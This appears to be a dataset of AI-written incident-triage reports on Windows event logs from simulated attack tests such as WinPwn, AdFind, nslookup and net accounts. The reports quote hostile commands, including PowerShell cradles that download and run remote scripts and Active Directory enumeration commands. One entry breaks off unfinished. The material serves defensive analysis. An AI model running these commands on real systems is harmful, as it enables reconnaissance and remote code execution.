#### Security Logs:
- There are several privilege assignments to a user named `admin_test`, including `SeDebugPrivilege`, which is sensitive and could be leveraged for unauthorized activities if not monitored.
- Logged network logon activity (Event ID 4624, LogonType 3) shows NTLM as the AuthenticationPackageName which is a less secure authentication method and can be suspicious if found outside controlled environments.

#### System and Application Logs:
- Several logs indicate time discrepancies and manipulations (Event IDs: 1) which could suggest attempts to evade logging or create confusion in timestamps for log correlation.

#### Sysmon Logs:
- Multiple executions of `wevtutil.exe` and `conhost.exe` related to the user `admin_test` which could indicate log tampering or command-line interface activity to manage event logs.
- Execution of `powershell.exe` as logged correlates with the PowerShell event logs, showing execution with downloading and executing a script, again highlighting a potential unauthorized or malicious activity.

### Preliminary Assessment:
Given the presence of remote script execution through PowerShell and the usage of potential administrative privileges that can be leveraged for malicious purposes, this activity is classified as **MALICIOUS**. The behavior exhibited by running scripts from external sources without a legitimate business justification often indicates an active threat or compromise that needs immediate attention.

### Recommended Action Steps:
1. **Isolate the Machine:** Immediately isolate the affected machine (Server002) from the network to prevent further spread or data exfiltration.
2. **Review and Block IP/URL:** Examine the URL used in the PowerShell script execution. If unsafe, block it on the network firewall and proxy servers.
3. **Conduct a Thorough Investigation:** Perform a digital forensic investigation on Server002 to determine the full scope of the compromise.
4. **Check Privileged Accounts:** Audit the privileged accounts, especially `admin_test`, to ensure they have not been misused. Change credentials if necessary.
5. **Ensure Updated Security Measures:** Verify that all security solutions (e.g., EDR, antivirus) are up-to-date and functioning on the affected system and across the network to prevent further incidents.
6. **Review and Harden PowerShell Usage:** Apply strict controls on PowerShell execution across the environment to limit unauthorized script execution. Consider implementing logging and monitoring for PowerShell activity.
7. **Communicate with Stakeholders:** Notify relevant stakeholders, including IT, security teams, and potentially affected users, about the incident, ensuring proper crisis management and communication plans are activated.

Given these factors, a robust incident response plan should be enacted to address the immediate threat and prevent future occurrences."
Enumerate Active Directory Users with ADSISearcher,"After reviewing the provided Windows event logs, several activities stand out and warrant further attention:

### Windows PowerShell Log Analysis
1. **PowerShell Activity**: Multiple PowerShell events are observed across several sequence numbers. The command used is `powershell.exe & {([script]""objectcategory=user"").FindAll(); ([script]""objectcategory=user"").FindOne()}`. These script blocks are seemingly querying the Active Directory for user objects, which can be benign in a legitimate administrative context. However, these activities could also represent enumeration tools or scripts used by attackers to gather information about user accounts.

### Application Log Analysis
1. **Windows Defender is Active**: A log entry indicating that Windows Defender is running (`SECURITY_PRODUCT_STATE_ON`) is present, suggesting that the endpoint protection is operational during this timeframe.

2. **Edge Update Service Stopped**: Multiple entries indicating that the edgeupdate service has stopped. Stopping of update services can be suspicious if done without a valid reason, as attackers might stop services to introduce and keep vulnerabilities exploitative.

### System Log Analysis
1. **Time Change Events**: There are logs indicating changes in system time. While these can happen under legitimate reasons (such as time synchronization with a correct time source), malicious actors might alter system time to evade detection, manipulate triage timestamps, or deter forensic analysis.

### Sysmon Log Analysis
1. **Execution of System Utilities**: The use of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` executed by the user `admin_test` is noted. The execution of `whoami.exe` might represent a legitimate action to determine the current user context. However, it can be suspicious when conducted out of normal context or times. Such utilities are regularly used in enumeration techniques in attacks.

2. **Frequent Executions Related to MicrosoftEdgeUpdate**: There are numerous entries regarding executions of `MicrosoftEdgeUpdate.exe` and related setup executables. While this might be part of normal browser update operations, the volume and brief time span seem to be unusually high for typical update scenarios.

### Security Log Analysis
1. **Time Change Confirmation**: The security log also shows time change events logged with `svchost.exe` as the process. Similar concerns for potential misuse as noted in the system log apply.

### Summary and Assessment
Considering the use of PowerShell for directory queries, unusual number of processes related to Edge updates, and alterations in system time, the activities observed demonstrate behaviors consistent with enumeration and potential tampering activities often associated with an early stage of an attack or non-standard administrative actions.

### Resolution:
**SUSPICIOUS** - The activities captured in the logs contain potentially indicative malicious behaviors that require deeper investigation. Specifically, analyze the context and necessity of the PowerShell scripts, verify Edge update activities with legitimate update schedules, and evaluate the user account actions for the executing account `admin_test`.

### Guidance on How to Proceed
1. **Investigate User Actions**: Look deeper into any actions performed by the user `admin_test` to ensure they align with expected duties and are not unauthorized insider activities.
2. **Evaluate PowerShell Scripts**: Examine the scripts utilized in the PowerShell events for their source—understand if these were scheduled tasks or initiated unexpectedly.
3. **Verify Time Changes**: Confirm if the time adjustments were due to legitimate synchronization with external time sources to sidestep potential time tampering by malicious actors.
4. **Correlate with Network Traffic**: If possible, pair these events with network traffic logs that could provide evidence of exfiltration or unauthorized access attempts.
5. **Upgrade Monitoring and Alerts**: Enhance alert thresholds around such behaviors in the EDR and SIEM systems to capture these early potential indicators with better granularity and confidence.

This report should serve as a foundation for an in-depth investigation to determine the presence of any threat actor activities further."
BIOS Information Discovery through Registry,"Upon reviewing the provided Windows event logs, the following analysis identifies key activities in the logs:

1. **Application Log Analysis:**
   - The logs show entries related to the Software Protection Platform Service and EdgeUpdate services. The entries show that certain services were stopped, but nothing explicitly indicates malicious activities. The entries appear routine without any elevated privileges or sensitive executions typically associated with malicious intent.

2. **Security Log Analysis:**
   - Event ID 4616 indicates a change in system time by a process running as 'NT AUTHORITY\LOCAL SERVICE' (`svchost.exe`). While time changes can be associated with various benign activities such as daylight saving adjustments or NTP syncs, they can also be indicative of attempts to evade logging timestamps or obfuscate activities. However, given the context, there’s no clear evidence of malicious intent without additional corroborative data.

3. **Sysmon Log Analysis:**
   - A series of processes involving `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`, and `MicrosoftEdgeUpdate.exe` are noted, executable by the user `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM`.
   - Execution of `cmd.exe` with registry queries related to BIOS versions is unusual for standard user activity, indicating potential reconnaissance activities or automated system health checks, and should be looked at with caution.
   - The repetitive usage of processes within a short time, especially those involving system utilities like `wevtutil.exe` and `cmd.exe`, might suggest an automated script or administrative task at play.
   - High integrity level access by `admin_test` could be indicative of privileged access, but the activities logged do not obviously translate to malicious intent without more specific context or intent.

4. **System Log Analysis:**
   - The system log indicates normal kernel general activities and time synchronization with no apparent anomalies in basic parameters or any known threats.

**Assessment:**

Based on the aggregation of logs and events:

- **Benign activities:** The frequent occurrence of Microsoft Edge Update processes and EdgeUpdate service events suggest routine application updates and maintenance - activities typically regarded as benign.
- **Suspicious activities:** The time change events and command-line prompts querying system registry keys are suspicious without further context and verification. They could be either part of legitimate administrative tasks or scripting, or potentially reconnaissance efforts.
- **Malicious evidence:** No explicit malicious activities have been identified. The processes and activities, although somewhat unusual in their patterns and frequency, do not definitively indicate compromise without additional suspect patterns or corroborative evidence.

**Resolution:**

The content of the logs points to a **SUSPICIOUS** resolution. Although no outright malicious activity is confirmed, the dubious command-line registry queries and the timing and sequence of certain events suggest that further investigation is warranted to rule out compromise. This situation requires assurance through extended monitoring or a deeper contextual investigation into these activities to validate their legitimacy or identify potential threats.

**Guidance:**

To proceed, it is advised to:
1. Cross-reference these activities with scheduled tasks or administrative scripts that could explain such behaviors.
2. Monitor for recurring patterns or new suspicious activities involving the same processes or accounts.
3. Validate the intent and origin of the suspicious registry queries and command-line executions, possibly tracing any associated user activities or external connections.
4. Conduct a more in-depth analysis of file and network logs for additional cues."
Packet Capture Windows Command Prompt,"Upon analyzing the provided Windows event logs, several observations and key points were noted regarding potentially suspicious or anomalous behavior:

1. **PowerShell Activity**: There are multiple entries indicating the use of PowerShell, such as the initial invocation using the `powershell.exe` executable. PowerShell commands are often leveraged in both legitimate administrative tasks and malicious activities due to its powerful capabilities and scripting nature.

2. **Process Activities**: 
   - The process `powershell.exe` was used to download a file, `wireshark_installer.exe`, from an external URL via the `Invoke-WebRequest` command. The file is then executed silently (`/S` flag), indicating an unattended installation.
   - We see that `cmd.exe` was used to launch `tshark.exe` (a command-line version of Wireshark), suggesting that network packet capturing was initiated. This could potentially indicate snooping or data exfiltration efforts if done without explicit permission or context.

3. **Unattended Installations**: The installation of Wireshark and its associated components (such as `vc_redist.x64.exe` for Visual C++ Redistributables) were executed with flags indicating quiet and unattended operations. 

4. **High Integrity Level**: All processes are running at a high integrity level, meaning these actions were executed with elevated permissions – a point of concern if unauthorized or unexplained.

5. **Contextual Anomaly**: The operations took place under the user account `SERVER002\admin_test`. While the username might resemble a test account, the operations observed (like downloading external executables and executing them silently) could be legitimate in a testing or configuration context. However, if this activity is unexpected or unapproved, it might suggest account misuse or compromise.

6. **No Direct Evidence of Known Exploits**: Despite observing PowerShell executions and script-based downloads, there is no overt indication of known malicious payloads or exploit techniques within the logs. It could, however, identify a potential compromise if further corroborated by situational context or deviations from expected behavior.

### Assessment:
- **Current Findings**: The behavior of downloading and silently installing Wireshark using PowerShell and further executing packet capturing without explicit description or user approval is suspicious. There are no immediate indicators of compromise based on known signatures, but it resembles techniques used in post-exploitation phases of attacks.

### Suggested Resolution:
- **Classification: SUSPICIOUS**: The activities observed are suspicious due to their automation and stealth execution characteristics, possible misconfiguration or misuse of administrative capabilities, and potential for network monitoring or data exfiltration.
  
### Recommendation:
1. **Further Investigation**: Examine the origin of the PowerShell command. Verify the intent behind Wireshark's installation and use and confirm this aligns with administrative or testing procedures.

2. **User Confirmation**: Contact the account owner `admin_test` (or related system owners) to determine if the actions were intentional and authorized within the scope of their duties.

3. **Review Configuration and Baseline**: Cross-reference tasks with current IT and operational procedures to identify anomalies; review system and network logs for external communication or data exfiltration attempts.

4. **Harden Systems**: Consider restricting the use of PowerShell, validating script execution with signing policies, and limiting high-integrity operations to vetted scripts or applications.

This approach will ensure that if the activities are benign, they are documented, and if they are indeed malicious or unauthorized, corrective actions can be immediately pursued."
WinPwn - PowerSharpPack - Seatbelt,"After analyzing the provided logs, several entries indicate suspicious activity. Here's a breakdown of the findings:

1. **Windows PowerShell Log Analysis:**
   - A PowerShell command was executed: `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-Seatbelt.ps1') Invoke-Seatbelt -Command ""-group=all""}`.
   - This command is executed via `iex`, known as Invoke-Expression, which can be used to execute a string as a command. This pattern is a common technique for executing malicious scripts, often seen in fileless malware attacks, as it involves downloading a script from a remote location and running it directly in memory.
   - `Invoke-Seatbelt.ps1` is a known script used for gathering system information. While used legitimately by administrators, it is also often used by attackers for reconnaissance, to understand the environment before deploying further payloads.

2. **Sysmon Log Analysis:**
   - Powershell execution with the same suspicious command is logged with high integrity, possibly indicating elevated privileges: `""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-Seatbelt.ps1')}`.
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` executions by `admin_test`, which could be part of normal log manipulation or indicative of process masquerading; however, the context points towards potential script execution manipulation.

3. **Security and System Logs:**
   - Multiple `svchost.exe` instances and time manipulation entries, which on their own do not indicate malicious activity but could be correlated with other activities.

**Assessment:**
- **SUSPICIOUS**: The logs contain suspicious activities that indicate the potential for malicious behavior, especially considering the usage of the Invoke-Expression with a download and execution of PowerShell script from an external site. Although the script could be legitimate, it requires further investigation to rule out malicious intent.

**Recommendations and Next Steps:**
1. **Immediate Isolation**: If the CEO's machine (Server002) is still in use, consider isolating it from the network to prevent any potential spread of compromise or exfiltration of sensitive information.
   
2. **Investigate Origin**: Determine how the PowerShell command was initiated, whether through user action or an automated process. Investigate user `SERVER002\\admin_test` for any unauthorized activities.

3. **Evaluate the Script**: Obtain and analyze the downloaded `Invoke-Seatbelt.ps1` script to understand its functionalities and capture any potential harmful payloads.

4. **Conduct a Forensic Analysis**: Examine the machine for further artifacts or signs of compromise, such as unusual file modifications, persistence mechanisms, or other reconnaissance actions.

5. **Review Network Traffic**: Check for unusual outbound connections from Server002, potentially related to C2 communication or data exfiltration.

6. **Update Security Measures**: Ensure antivirus or endpoint protection is current and has conducted a full scan of the system. Deploy further host-based intrusion detection systems if needed.

Based on these findings, the resolution is marked as SUSPICIOUS, requiring further investigation to determine the presence and scope of any compromise."
DNS Server Discovery Using nslookup,"Upon reviewing the provided Windows event logs, the analysis focuses primarily on identifying any suspicious or anomalous behavior that could indicate malicious activity or a potential compromise of the host.

### Detailed Analysis:

1. **Sysmon Logs:**
   - **Process Activity**:
     - There is frequent execution of typical Windows system utilities like `whoami.exe`, `cmd.exe`, `nslookup.exe`, `wevtutil.exe`, and processes like `conhost.exe`. These programs are often used for system administration but can also be leveraged by attackers for malicious purposes, particularly in enumeration or data exfiltration.
     - The `cmd.exe` spawned by `wsmprovhost.exe` with the command line `""cmd.exe"" /c nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%%USERDNSDOMAIN%%` stands out. The use of `nslookup` in this manner is typical for network reconnaissance to identify domain controllers.
   
2. **Windows Update and Antivirus Activity:**
   - There are several updates and antivirus activities logged with `wuauclt.exe` and `AM_Delta.exe`, along with signature updates from Microsoft Defender. This behavior is consistent with normal system maintenance and doesn't indicate malicious activity by itself.

3. **Miscellaneous System Processes:**
   - **`svchost.exe`, `dllhost.exe`, and `MusNotification.exe`** are being invoked, which are legitimate system processes. However, these should be monitored to ensure they aren't being used in a non-standard way by a malicious actor.

4. **User and Integrity Levels:**
   - The majority of the logged processes are executed by the user `SERVER002\admin_test` with a high integrity level, suggesting they have administrative privileges. While not unusual for an admin account, it increases the risk if the account is compromised.

### Assessment:

- **Malicious Tools or Techniques**: There is no definitive indication of typical malicious tools, like known malware executables or scripts. Nonetheless, there are some instances of typical reconnaissance activity via `nslookup`.
- **Uncommon Patterns**: The execution pattern of `whoami` and `nslookup` in rapid succession, while interesting, could also be results of legitimate administrative activities if these processes are being used as part of routine system checks or updates.

### Guidance and Resolution:

Given the context and the logs available:
- The activity related to `cmd.exe` and `nslookup.exe` could potentially signal reconnaissance efforts, especially if not done regularly as part of system administration.
- Further investigation is warranted to rule out unauthorized activity:
  - **Validate Activity Context**: Check with the admin responsible for possible legitimate intentions.
  - **Authentication and Access Logs**: Review authentication logs for unusual logins or access patterns to the admin account (`SERVER002\admin_test`).
  - **Network Traffic Analysis**: Capture and analyze network traffic to and from the host during this timeframe to identify any suspicious connections.

### Final Resolution:
**SUSPICIOUS** - While most actions can fit within normal administrative behavior, the potential reconnaissance activity noted by the `nslookup` command prompts for further investigation to verify authenticity and access legitimacy to ensure no malicious activity or compromise is occurring."
Examine local password policy - Windows,"### Analysis of Windows Event Logs

#### Overview

The logs provided cover events from the **Application**, **Sysmon**, **PowerShell** (empty), and **Security** (empty) channels on a system identified as `Server002`. The focus is on a series of activities related to process execution predominantly involving Microsoft Edge Update utilities and a few other system processes. 

#### Suspicious Findings

1. **Repeated Execution of System Utilities:**
   - Several instances of Windows utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` are executed by the user `SERVER002\admin_test`. These command-line tools can be used for legitimate administrative purposes but can also indicate reconnaissance or further adversarial use if not expected.

2. **Unusual Process Execution from CMD:**
   - There is a command executed, `""cmd.exe"" /c net accounts`, which queries account policies. This is often used during reconnaissance to gather information about password policy and account settings, potentially indicating someone's probing system policies.

3. **Multiple Instances of Microsoft Edge Update Processes:**
   - Multiple entries show Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) running under `NT AUTHORITY\SYSTEM`. While these could be update activities, the frequency and volume are noteworthy. Typically, software updates would trigger relatively few executions rather than this many repetitive commands.

4. **Presence of Commands in Systems Temp Directory:**
   - Some processes like `MicrosoftEdgeUpdate.exe` are invoked from a temporary directory. This is less common for trusted applications unless they are in the middle of an update or installation process, which raises concerns about their legitimacy if they were not scheduled updates.

5. **Sysmon Process Creation Events:**
   - A high volume of Sysmon process creation logs for various system and utility processes both within and outside standard directories, which may either be indicative of normal patch management behavior or something more suspicious depending on context.

#### Indicators of Malicious Activity

- The `cmd.exe` command involving the `net accounts` usage is potentially suspicious, as it suggests an interest in account policies, possibly for privilege escalation or account takeover attempts.
- The repeated execution of `MicrosoftEdgeUpdate` processes and their derivatives in close intervals might suggest an update function, but it is more indicative of potentially suspicious activity due to the number and timing unless recently scheduled updates align with this timestamp.

#### Assessment

Upon thorough examination, the logs show several behaviors which might be normal in certain contexts (e.g., ongoing system updates or administrative actions). However, in combination, they warrant further investigation, particularly the command-line execution for account policies and the Microsoft Edge update processes' anomalies. 

### Resolution

- **SUSPICIOUS:** The activities noted in the logs warrant additional investigation to ascertain whether `MicrosoftEdgeUpdate` processes are truly part of a legitimate update or if they represent an illicit persistence mechanism. The exploration of account querying suggests exploratory or preparatory steps for privilege escalation.

### Guidance on How to Proceed

1. **Verify Scheduled Updates:**
   - Cross-reference the execution of Microsoft Edge processes with planned updates to ensure these are consistent with legitimate activity.

2. **Audit Command Usage:**
   - Investigate the context and need for running `cmd.exe` with `net accounts`. Check other activities of the user `SERVER002\admin_test` for further insights.

3. **Threat Detection:**
   - Implement monitoring to track subsequent activities of concern, such as unauthorized access attempts or further utilization of system utilities like `wevtutil.exe`.

4. **Network Anomaly Detection:**
   - Check for any abnormal outbound connections from `Server002` around the time of these logs, which could indicate information is being exfiltrated.

5. **Review Privileges:**
   - Assess user privileges and ensure accounts, especially `admin_test`, adhere to the principle of least privilege. 

By taking these actions, the company can better identify whether a security incident is occurring and mitigate any risks associated with potential unauthorized activities."
WinPwn - GPOAudit,"Upon analyzing the provided Windows event logs, several key observations can be highlighted:

### Suspicious or Anomalous Behavior:
1. **PowerShell Execution:**
   - There are multiple PowerShell events indicating that a PowerShell script was executed on the system. The command involves downloading a script from a GitHub repository (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`) and running `GPOAudit -noninteractive -consoleoutput`.
   - This behavior is suspicious as it involves executing a script directly from a remote source, which is a common technique used in attack scenarios.

2. **Sysmon Logs:**
   - The Sysmon logs indicate the execution of system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and PowerShell itself. The execution of these utilities, especially PowerShell and the downloading of remote scripts, is notable.

3. **User Context:**
   - The operations are being carried out under the context of the user `SERVER002\admin_test`, which suggests that this account has administrative privileges. The use of such an account heightens the risk associated with the observed activities.

4. **Other Logs:**
   - Application logs reveal that Windows Defender is active, which is a positive sign for initial protection against malicious activity.
   - System and security logs do not indicate immediate irregularities related to the suspicious PowerShell activity.

### Indicators of Malicious Activity:
- **Remote Script Execution:** The PowerShell log entries that suggest a script being downloaded from the internet and executed on the system are clear indicators of potentially malicious behavior, especially when such scripts are not from a trusted source or repository.
- **Unusual Utility Execution:** The execution pattern and timing of system utilities such as `wevtutil.exe` could be indicative of activities related to log clearing or system reconnaissance, often seen in post-exploitation phases.

### Assessment:
- **Resolution: MALICIOUS.** 
  There is sufficient evidence of potentially malicious activity associated with the execution of a PowerShell script from a remote source. Such behavior is consistent with common tactics employed in threats like malware delivery or reconnaissance.

### Recommendations:
1. **Immediate Containment:** Isolate the affected system (Server002) from the network to prevent potential spread or further compromise.
2. **Investigate the Script:** Analyze the script hosted at the URL retrieved in the PowerShell logs to determine its purpose and impact.
3. **Review Administrative Access:** Assess all accounts with administrative privileges, particularly `SERVER002\admin_test`, for any signs of misuse or unauthorized access.
4. **Enhance Monitoring:** Increase monitoring of PowerShell and network activities for other systems within the network.
5. **Conduct a Threat Hunt:** Perform a thorough threat assessment on associated systems to identify if there are similar undetected threats present.
6. **Patch Management:** Ensure all systems are updated with the latest security patches to mitigate any exploited vulnerabilities.

Based on the assessment, immediate investigative and preventive actions should be carried out to address and mitigate the identified threat."
WinPwn - DotNet,"**Detailed Analysis of the Logs:**

Upon examining the provided event logs, several points of interest emerge across the different types of logs:

1. **Windows PowerShell Log:**
   - Multiple PowerShell events (EventID: 600) indicate the execution of script commands using `iex (Invoke-Expression)` and `new-object net.webclient` to download and execute a script (script.ps1) from an external source (GitHub, raw.githubusercontent.com). 
   - This behavior is suspicious as it involves downloading and executing scripts from an unverified external source, which is a common technique used by attackers to deliver and execute malicious payloads.

2. **Security Log:**
   - Time manipulation events (EventID: 4616) with process `svchost.exe` indicate a potential attempt to alter the system time which can be used to evade detection or to align the system time with a different timeline for malicious activities.
   - The presence of a logon session with elevated privileges (EventID: 4672) using NTLM authentication (EventID: 4624) without a clear origin for the session is concerning and could suggest unauthorized privilege escalation.

3. **System Log:**
   - The system log does not immediately show glaring issues but corroborates the timing of suspicious activities such as the time change initiated by `svchost.exe`.

4. **Application Log:**
   - Not much suspicious activity noted here, but there are events related to Windows Defender which indicate its active status.

5. **Sysmon Log:**
   - There is execution of PowerShell.exe with suspicious command-line arguments aligning with those found in the PowerShell logs. This further corroborates the execution of potentially malicious scripts.
   - Execution of `wevtutil.exe` (event log command tool) numerous times by the user `admin_test` could be used for event log clearing or manipulation, which is a common tactic for attackers to hide their tracks.
   - Frequent occurrences of `conhost.exe`, which might not be inherently suspicious, could be linked to console host activities involving PowerShell or other command-line executions during a compromise.

**Assessment and Resolution:**

- **Assessment:**
  - The combination of downloading and executing scripts from an untrusted, external source, attempts to manipulate system time, and evidence of elevated privileges and potentially malicious PowerShell script execution strongly indicate the presence of malicious activity. These activities are consistent with common attack vectors such as initial access via phishing or drive-by-download leading to potential system compromise.
  
- **Resolution: MALICIOUS**
  - The provided logs contain clear indicators of compromise through suspicious PowerShell activities and unauthorized system changes. Continuous monitoring and more comprehensive investigation into these activities and associated network traffic are recommended. Additionally, review the source and integrity of the scripts executed and identify any backdoors or persistent malicious processes on the host.

**Guidance:**
- Immediate steps should include isolating the affected host to prevent further spread.
- Conduct a comprehensive malware scan and review system changes made during the suspicious time window.
- Ensure all relevant security patches and updates are applied, and that monitoring and alerting configurations in tools like EDR and SIEM are tightened to increase detection capabilities.
- Consider implementing application whitelisting and strict PowerShell execution policies to thwart unauthorized script execution."
Process Discovery - get-wmiObject,"## Detailed Analysis

### Suspicious or Anomalous Behavior:
1. **Time Change Observations:**
   - There are events indicating a system time change on `2024-10-22 19:17:57`. The `NewTime` is set before the `PreviousTime`, which could indicate time manipulation. This action can sometimes be used by malicious actors to obscure their tracks but can also happen during normal system operations or updates.

2. **Use of PowerShell:**
   - There are multiple instances of PowerShell executions with the command line argument to execute `get-wmiObject -class Win32_Process`. PowerShell is a legitimate tool, but it is also frequently used by attackers for reconnaissance, execution, and lateral movement due to its powerful scripting capabilities.

3. **Privileged Account Activity:**
   - The logs indicate use of the user account `SERVER002\\admin_test` possessing a broad set of high-level privileges (e.g., `SeDebugPrivilege`). This could point to a potential for privilege abuse if these privileges were not intended for routine tasks.

4. **Use of `wevtutil.exe` and `conhost.exe`:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executions by the `admin_test` user. While these are legitimate Windows binaries, `wevtutil.exe` is a command-line utility often used to manage event logs and could be used maliciously to clear or alter logs.

5. **Logon Events:**
   - There are multiple logon events connected to `admin_test` using NTLM authentication (Logon Type 3), which represents network logons. Given the privileges and the network login method, it’s important to validate this user's actions against expected behavior.

6. **System and Security Logs:**
   - The presence of `TiWorker.exe` and `TrustedInstaller.exe` processes indicate normal Windows servicing updates, which usually run under NT AUTHORITY\SYSTEM.

### Assessment and Indication of Malicious Activity:
The logs present potentially suspicious activities, especially the time manipulation, multiple executions of PowerShell with `$get-wmiObject` command, and the use of utilities like `wevtutil.exe` which might indicate an attempt to manage or hide specific logs. The presence of high privileges (`SeDebugPrivilege` and others) on the user `admin_test` while executing these actions could indicate that this account was leveraged to perform these potentially suspicious activities.

### Final Resolution:
**Resolution: SUSPICIOUS**

Given the above points - notably the time change, use of PowerShell, and high privileges associated with potential system log manipulations - the events flagged deserve further investigation to rule out malicious intent. This includes verifying the legitimacy of the time change action, validating the actions against expected user behavior, and ensuring that PowerShell script executions are for legitimate administrative duties.

### Guidance on How to Proceed:
1. Conduct a review on the user `SERVER002\\admin_test` to confirm whether the elevated privileges are appropriate and expected.
2. Examine network traffic around the timestamps related to the PowerShell execution for any unusual outbound connections.
3. Investigate the source or intent of the PowerShell script(s) executed to exclude potential reconnaissance or data extraction actions.
4. Audit additional host logs for any signs of privilege escalation or further use of risky binaries like `wevtutil.exe`.
5. Based on findings, consider restricting unnecessary privileges and scrutinizing PowerShell use on the network with appropriate logging and monitoring."
System Network Connections Discovery,"After analyzing the provided Windows event logs from the Sysmon, Application, and Security channels, a few pieces of information stand out:

### Observations:

1. **Sysmon Log Observations:**
   - Multiple executions of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, `netstat.exe`, `net.exe`, and `net1.exe` were recorded. 
   - The `cmd.exe` process was executed with a command to check network connections and sessions using `netstat`, `net use`, and `net sessions`.
   - We see the `wevtutil.exe` process being executed multiple times. This utility is commonly used to manage event logs, and its frequent invocation can be indicative of someone attempting to clear or export logs.
   - Processes are executed with a high integrity level, most of the processes are executed by the same user `admin_test` indicating elevated privileges.

2. **Security Log Observations:**
   - Various events related to logon (`4624`) and special privileges assigned to `admin_test` are recorded (`4672`). These include privileges like `SeDebugPrivilege`, and `SeTakeOwnershipPrivilege`, both of which are typically sensitive and may indicate elevated access or privilege escalation activities.
   - The presence of NTLM logon types (`LogonType 3`) from external IP addresses (`fe80::e3b5:5371:12a8:9c77`, `fe80::866a:d1f8:8d06:7bc`) are recorded. The remote logins might indicate unauthorized access attempts.

3. **Application Log Observations:**
   - Information regarding the execution of the Software Protection Platform Service session.

4. **Other Behavioral Indicators:**
   - The consistent simultaneous presence of `conhost.exe` whenever certain command-line executions (like those from `cmd.exe`) occur is typically standard; however, it's also indicative of script or command execution sessions.
   - The updating and setup processes of Microsoft Edge (`setup.exe` from EdgeUpdate) are running under `NT AUTHORITY\SYSTEM`, suggesting a scheduled or system-level application update. This seems standard for an update process, but the context should always be verified.

### Assessment:

The combination of network diagnostic commands (`netstat`, `net use`, and `net sessions`), frequent event log utility (`wevtutil.exe`) access, and the assignment of sensitive privileges all point towards potentially suspicious activities. The nature of the commands executed, and the elevated privileges used for their execution, can indicate an unauthorized probing or an attempt to identify or exfiltrate data.

Also, the simultaneous presence of multiple high-privilege logon events and external IP addresses accessing the system further supports the potential for unwanted access or lateral movement within the network.

### Resolution:

**SUSPICIOUS**

Given the evidence, the logs contain activities that do not look typical and may warrant further investigation:
- The usage of sensitive privileges and network commands.
- Frequent event log access through `wevtutil.exe`.
- High-integrity level executions and remote logins.
- The combination of these elements may indicate unauthorized boundary probing or an internal reconnaissance attempt.

### Guidance on How to Proceed:

- **Immediate Actions:**
  - Verify the identity and intent of the `admin_test` user.
  - Lock or watch entries and exits for the external IP addresses recorded in the Logon events.
  - Review subsequent system logs for any signs of privilege abuse or lateral movement.

- **Recommended Mitigation:**
  - Conduct a thorough security assessment on the server in question.
  - Implement stringent monitoring and alerting for the usage of administrative privileges and access to `wevtutil.exe`.
  - Cross-reference these logs with other network activity logs to understand the scope and potential of a compromise.

If further activity aligns suspiciously or unexpectedly, the risk assessment should be escalated accordingly."
WinPwn - General privesc checks,"Upon reviewing the provided Windows event logs from the CEO's machine, several observations can be made:

### Observations and Analysis:

1. **PowerShell Log Activity:**
   - The PowerShell logs reveal that PowerShell was invoked with the command to download and execute a script from a GitHub repository. The command used is:
     ```powershell
     $script_repo='https://raw.githubusercontent.com/script'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1')
     ```
   - This activity is highly suspicious as it involves downloading and executing a potential script from an external source on the internet, which is a common method used by attackers to execute malicious code on a target machine.

2. **Sysmon Logs:**
   - Multiple instances of standard Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and PowerShell (`powershell.exe`) are seen executing around the same time.
   - The execution of `HOSTNAME.EXE` and `WHOAMI.exe` might be attempts to gather information about the system and user context.
   - The PowerShell execution matches the one identified in PowerShell logs where it downloads and possibly executes an external script, which aligns with tactics used in attacks.

3. **Application and System Logs:**
   - There are logs indicating the update activities of Microsoft Edge, which appear normal and automated. 
   - No additional suspicious activities were observed in the Application and System logs directly related to malware indicators.

4. **Security and Kernel Logs:**
   - No anomalous activities such as unauthorized privilege escalations or authentication anomalies appear evident here that indicate compromise through these logs.

### Assessment of the Situation:

- **Malicious Activity Detected:**
  - The PowerShell used in conjunction with internet-accessed scripts suggests potential malicious behavior. This activity could be a part of a larger attempt to execute unwanted or harmful code on the system.
  - The natural system utilities usage might be part of standard operations but, when combined with suspicious PowerShell activities, indicate a possible script running to collect system and user data.

### Threats and Risks Identified:

- **Execution of Remote Scripts:**
  - The execution of scripts from a non-reputable external source poses significant threats and risks of potential malware or unauthorized checks or commands being executed on the system.

Adfind - Enumerate Active Directory User Objects,"Upon reviewing the provided Windows event logs, I have identified some activity that warrants further scrutiny. Here's a detailed analysis of the logs:

### Suspicious Activity Detected

1. **Execution of AdFind.exe**: 
   - The event log entry indicates the execution of `AdFind.exe` through the command line: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -f (objectcategory=person)`. This tool is often used by attackers for Active Directory enumeration, which is a precursor to more sophisticated attacks like lateral movement or privilege escalation.

2. **Use of `wevtutil.exe`**: 
   - Multiple instances of `wevtutil.exe` being executed. This tool is used for managing Windows Event Logs and can be indicative of an attacker attempting to clear logs to cover their tracks.

3. **Unusual Command Line Execution**:
   - The presence of `whoami.exe` and `hostname.exe` executions, although common executables, could be part of a larger script or attack sequence to gather user and hostname information for subsequent actions.

4. **Execution from Temporary Paths**:
   - The execution of a Microsoft Edge update setup from a temporary path: `C:\\Program Files (x86)\\Microsoft\\Temp\\EUBACA.tmp\\MicrosoftEdgeUpdate.exe`. This path combined with repetitive installations suggests either a legitimate software update issue or disguising malicious activity.

5. **Use of High Privileges**:
